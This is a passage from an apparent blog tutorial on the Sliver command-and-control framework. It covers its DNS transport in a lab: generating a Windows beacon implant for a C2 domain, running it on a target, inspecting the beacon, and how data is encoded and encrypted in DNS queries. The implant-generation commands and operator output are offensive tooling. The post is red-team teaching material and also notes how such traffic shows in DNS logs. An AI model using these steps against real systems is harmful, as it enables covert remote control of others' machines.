+<pre tabindex="0"><code>sliver &gt; generate beacon --dns dnsc2.labnet.local --seconds 10 --jitter 0 --save /tmp/dns.exe
+
+[*] Generating new windows/amd64 beacon implant binary (10s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 00:00:20
+[*] Implant saved to /tmp/dns.exe
+</code></pre><p>Transfer the binary to the Windows target (I usually do it by hosting it with Apache,
+then downloading it to the target). When done, execute it.
+Shortly after, you should get a beacon in Sliver:</p>
+<pre tabindex="0"><code>sliver &gt; beacons
+
+ ID         Name              Transport   Username   Operating System   Last Check-In   Next Check-In 
+========== ================= =========== ========== ================== =============== ===============
+ e351f589   SIMILAR_FEELING   dns         tester     windows/amd64      7s ago          3s
+
+sliver &gt; use e351f589
+
+[*] Active beacon SIMILAR_FEELING (e351f589-34a0-4a4f-8821-413476a20c32)
+
+sliver (SIMILAR_FEELING) &gt; info
+
+         Beacon ID: e351f589-34a0-4a4f-8821-413476a20c32
+              Name: SIMILAR_FEELING
+          Hostname: DESKTOP-2CNJ1IR
+              UUID: b6b566b3-95de-44f3-98d8-cc71a9e04829
+          Username: DESKTOP-2CNJ1IR\tester
+               UID: S-1-5-21-352893395-444706649-1566723291-1001
+               GID: S-1-5-21-352893395-444706649-1566723291-513
+               PID: 3404
+                OS: windows
+           Version: 10 build 19044 x86_64
+              Arch: amd64
+         Active C2: dns://dnsc2.labnet.local
+    Remote Address: n/a
+         Proxy URL: 
+          Interval: 10s
+            Jitter: 0s
+</code></pre><p>In the picture below, you can see the network traffic created by the beacon.
+It gives you a glimpse into how DNS C2 works.
+You can see a lot of DNS queries for A records of subdomains of <code>dnsc2.labnet.local</code>,
+to which Sliver responds with seemingly random IP addresses.
+There is also a query for a TXT record.</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/28_sliver_c2_transports_in_detail_dns/dns_traffic_wireshark.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>DNS C2 traffic in Wireshark</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>All the data is actually encoded within the messy garbled strings you see in the screenshot.
+My understanding of <a href="https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/dnsclient/dnsclient.go">the code</a>
+is as follows. Whenever the implant wants to send data to the server, it has to encode it
+in the subdomain of <code>dnsc2.labnet.local</code> that it queries for. The server will receive
+this query and return some IP address.
+When the server wants to send data to the implant, the implant has to do a TXT query
+so that the server can respond to it with some data.</p>
+<p>Since a domain name can only be 254 characters long, Sliver can send only very small
+pieces of data with each query. Accordingly, connection speed will be very slow.
+Do not attempt to up- or download large files.</p>
+<p>Exactly how Sliver encodes the data is described in great detail in the <a href="https://github.com/BishopFox/sliver/wiki/DNS-C2">wiki</a>.
+For me, the main takeaway was that there are two options. It may either use Base58 or Base32.
+Since DNS is a case-insensitive protocol, Base32 would technically be required.
+However, both upper- and lowercase characters are allowed and some resolvers preserve the case,
+which may allow to use more characters, i.e., Base58. Sliver attempts to auto-detect if Base58
+can be used as it establishes the connection. If you feel like auto-detection might be a problem
+for you, you can enforce Base32 with an
+<a href="https://github.com/BishopFox/sliver/wiki/C2-Advanced-Options#dns-c2-advanced-options">advanced C2 option</a>
+and see if that helps. A command like <code>generate beacon --dns dnsc2.labnet.local?force-base32=True ...</code>
+generates such a beacon, which encodes all data lowercase (at the expense of speed of course).</p>
+<p>And before I forget: of course all data is encrypted with a session key exchanged when the connection
+is established. In <a href="https://github.com/BishopFox/sliver/blob/160486c55f2b6b12a9442187d019d422efd472e0/implant/sliver/transports/dnsclient/dnsclient.go#L311">the code</a>
+you can see how the implant generates a key, encrypts it with the server&rsquo;s public key
+and sends it over (details about transport encryption in <a href="https://github.com/BishopFox/sliver/wiki/Transport-Encryption">the wiki</a>).</p>
+<p>Accordingly, any DNS traffic that gets logged cannot be used to observe the actual messages
+exchanged between implant and C2 server. However, it will be immediately clear to everyone
+that something phishy is going on when the DNS logs look like this:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/28_sliver_c2_transports_in_detail_dns/dns_logs_file_transfer.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>BIND DNS logs of a file download</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>The screenshot above is an excerpt of the DNS logs I&rsquo;ve captured on the proxy host on which I ran
+BIND in my lab (file was stored at <code>/var/log/bind/query</code>). This particular part was generated
+while I downloaded a relatively large file of about 2 MB. Clearly not stealthy.</p>
+<h2 id="sessions-and-dns-c2">Sessions and DNS C2</h2>
+<p>In Sliver, you can use all C2 protocols both in beacon and session mode.
+DNS C2 is no exception to this rule.
+For me though, sessions via DNS were very unstable, which is why I would not recommend
+using them outside of lab environment (at the time of writing - Sliver devs fix bugs fast).</p>
+<p>While I was able to establish sessions and use them for a while, I&rsquo;ve lost connection
+after seconds to minutes in all cases. And all this was done in a lab environment
+with perfect connectivity. The good thing is that implants are tenacious beasts and
+re-establish connections if they loose them. Thus, when you loose their session
+you may quickly get a new one back. All-in-all though you&rsquo;ll be better off with
+a beacon with short intervals, which will be much easier to use than a new session
+every few minutes, with unpredictable waiting times in between.</p>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2022-09-23T00:00:00&#43;00:00">
+    23 Sep, 2022
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/c2/">c2</a>, <a href="/categories/sliver/">sliver</a> and <a href="/categories/tutorial/">tutorial</a></span>
+  
+  
+    and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/dns/">dns</a>, <a href="/tags/sliver/">sliver</a> and <a href="/tags/tutorial/">tutorial</a>
+  
+  using <span itemprop="wordCount">1793</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/learning_sliver_c2_04_transports_in_detail_http_and_https/">Learning Sliver C2 (04) - Transports in Detail: HTTP and HTTPS</a>
+        <time datetime="18M">18 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/">Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard</a>
+        <time datetime="11M">11 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_02_beacons_and_sessions/">Learning Sliver C2 (02) - Beacons and Sessions</a>
+        <time datetime="13M">13 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_01_installation/">Learning Sliver C2 (01) - Tutorial / Installation</a>
+        <time datetime="8M">8 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
